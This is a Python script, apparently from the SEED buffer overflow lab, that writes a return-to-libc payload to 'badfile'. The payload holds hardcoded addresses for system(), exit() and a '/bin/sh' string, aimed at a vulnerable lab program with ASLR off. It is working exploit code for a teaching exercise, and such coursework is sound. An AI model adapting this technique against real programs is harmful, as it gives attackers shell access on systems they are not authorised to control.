#!/usr/bin/python3
# From SEED buffer overflow lab. Task 3. No ASLR.

import sys

content = bytearray(0xaa for i in range(36))

X = 32 #20+4+4+4
sh_addr = 0xbffff18b #0xbffff09a terminator #0xbffff18b terminal
content[X:X+4] = (sh_addr).to_bytes(4,byteorder='little')

Y = 24 #20+4
system_addr = 0xb7e42da0 #0xb7e7d410 strlen #0xb7e51670 printf #0xb7e42da0 system #0xbbbbbbbb 
content[Y:Y+4] = (system_addr).to_bytes(4,byteorder='little')

Z = 28 #20+4+4
exit_addr = 0xb7e369d0 #0xcccccccc #
content[Z:Z+4] = (exit_addr).to_bytes(4,byteorder='little')

with open("badfile","wb") as f:
	f.write(content)
